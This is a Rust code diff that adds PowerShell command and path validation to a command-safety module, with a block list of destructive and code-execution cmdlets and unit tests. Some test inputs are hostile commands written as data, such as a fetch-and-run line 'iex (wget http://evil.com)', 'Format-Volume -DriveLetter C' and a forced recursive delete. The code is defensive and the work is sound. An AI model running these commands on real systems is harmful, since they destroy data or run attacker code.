@@ -431,6 +431,116 @@ pub fn validate_bash_command(command: &str) -> Result<(), String> {
 }
 
 // =========================================================================
+// 7. PowerShell — Windows path validation + dangerous cmdlets
+// =========================================================================
+
+/// Dangerous PowerShell cmdlets that should be blocked or flagged.
+const POWERSHELL_DANGEROUS_CMDLETS: &[&str] = &[
+    "remove-item",
+    "del",
+    "rd",
+    "rmdir",
+    "format-volume",
+    "clear-disk",
+    "stop-computer",
+    "restart-computer",
+    "stop-process",
+    "invoke-expression",
+    "iex",
+    "invoke-webrequest",
+    "start-process",
+    "new-service",
+    "set-executionpolicy",
+    "disable-windowsoptionalfeature",
+    "clear-content",
+    "clear-recyclebin",
+];
+
+/// Check if a command looks like PowerShell (pwsh/powershell invocation or cmdlet syntax).
+pub fn is_powershell_command(command: &str) -> bool {
+    let first = first_command_word(command);
+    matches!(first, "pwsh" | "powershell" | "powershell.exe" | "pwsh.exe")
+        || command.contains("| ") && command.to_lowercase().contains("-object")
+        || command.contains("$env:")
+        || command.contains("Get-") || command.contains("Set-")
+        || command.contains("Remove-") || command.contains("Invoke-")
+}
+
+/// Validate a Windows/PowerShell path for safety.
+pub fn validate_powershell_path(path: &str) -> Result<(), String> {
+    let normalized = path.replace('\\', "/").to_lowercase();
+
+    // Block system-critical paths
+    let critical_paths = [
+        "c:/windows/system32",
+        "c:/windows/syswow64",
+        "c:/program files",
+        "c:/programdata",
+        "/windows/system32",
+        "system32",
+    ];
+    for critical in &critical_paths {
+        if normalized.contains(critical) {
+            return Err(format!("Path targets system-critical location: {path}"));
+        }
+    }
+
+    // Block registry paths
+    if normalized.starts_with("hklm:") || normalized.starts_with("hkcu:") || normalized.starts_with("registry::") {
+        return Err(format!("Registry path access blocked: {path}"));
+    }
+
+    // Block UNC paths to prevent network access
+    if path.starts_with("\\\\") || path.starts_with("//") {
+        return Err(format!("UNC/network path blocked: {path}"));
+    }
+
+    Ok(())
+}
+
+/// Check if a PowerShell command contains dangerous cmdlets.
+pub fn is_dangerous_powershell(command: &str) -> bool {
+    let lower = command.to_lowercase();
+    for cmdlet in POWERSHELL_DANGEROUS_CMDLETS {
+        if lower.contains(cmdlet) {
+            return true;
+        }
+    }
+    // Check for -Force flag on destructive operations
+    if lower.contains("-force") && (lower.contains("remove") || lower.contains("del") || lower.contains("clear")) {
+        return true;
+    }
+    false
+}
+
+/// Full PowerShell command validation.
+pub fn validate_powershell_command(command: &str) -> Result<(), String> {
+    if !is_powershell_command(command) {
+        return Ok(()); // Not PowerShell, skip
+    }
+
+    if is_dangerous_powershell(command) {
+        return Err(format!("Dangerous PowerShell cmdlet detected: {command}"));
+    }
+
+    // Extract paths from common patterns and validate
+    // -Path "..." or -LiteralPath "..."
+    for flag in &["-path", "-literalpath", "-destination"] {
+        if let Some(pos) = command.to_lowercase().find(flag) {
+            let after = &command[pos + flag.len()..];
+            let path = after.trim().trim_matches('"').trim_matches('\'');
+            let path_end = path.find(|c: char| c.is_whitespace() || c == '"' || c == '\'').unwrap_or(path.len());
+            let extracted = &path[..path_end];
+            if !extracted.is_empty() {
+                validate_powershell_path(extracted)?;
+            }
+        }
+    }
+
+    Ok(())
+}
+
+// =========================================================================
 // Helpers
 // =========================================================================
 
@@ -640,5 +750,54 @@ mod tests {
         assert_eq!(first_command_word("FOO=bar ls -la"), "ls");
         assert_eq!(first_command_word("A=1 B=2 echo hi"), "echo");
         assert_eq!(first_command_word("ls -la"), "ls");
+    }
+
+    // --- PowerShell ---
+    #[test]
+    fn powershell_command_detected() {
+        assert!(is_powershell_command("pwsh -c Get-Process"));
+        assert!(is_powershell_command("powershell Remove-Item foo"));
+        assert!(is_powershell_command("Get-ChildItem | Select-Object Name"));
+        assert!(is_powershell_command("$env:PATH"));
+        assert!(!is_powershell_command("ls -la"));
+        assert!(!is_powershell_command("echo hello"));
+    }
+
+    #[test]
+    fn powershell_dangerous_cmdlets() {
+        assert!(is_dangerous_powershell("Remove-Item -Recurse -Force C:\\temp"));
+        assert!(is_dangerous_powershell("Invoke-Expression $cmd"));
+        assert!(is_dangerous_powershell("iex (wget http://evil.com)"));
+        assert!(is_dangerous_powershell("Stop-Computer"));
+        assert!(is_dangerous_powershell("Format-Volume -DriveLetter C"));
+        assert!(is_dangerous_powershell("Set-ExecutionPolicy Unrestricted"));
+        assert!(!is_dangerous_powershell("Get-Process"));
+        assert!(!is_dangerous_powershell("Get-ChildItem"));
+    }
+
+    #[test]
+    fn powershell_path_validation() {
+        assert!(validate_powershell_path("C:\\Windows\\System32\\cmd.exe").is_err());
+        assert!(validate_powershell_path("C:\\Program Files\\app").is_err());
+        assert!(validate_powershell_path("HKLM:\\SOFTWARE\\Microsoft").is_err());
+        assert!(validate_powershell_path("\\\\server\\share").is_err());
+        assert!(validate_powershell_path("//server/share").is_err());
+        assert!(validate_powershell_path("C:\\Users\\me\\project").is_ok());
+        assert!(validate_powershell_path("/tmp/safe").is_ok());
+    }
+
+    #[test]
+    fn powershell_full_validation() {
+        assert!(validate_powershell_command("pwsh -c Remove-Item -Force foo").is_err());
+        assert!(validate_powershell_command("powershell Invoke-Expression $x").is_err());
+        assert!(validate_powershell_command("ls -la").is_ok()); // not PowerShell
+        assert!(validate_powershell_command("pwsh -c Get-Process").is_ok());
+    }
+
+    #[test]
+    fn powershell_path_in_command() {
+        assert!(validate_powershell_command(
+            "pwsh -c Get-ChildItem -Path \"C:\\Windows\\System32\""
+        ).is_err());
     }
 }
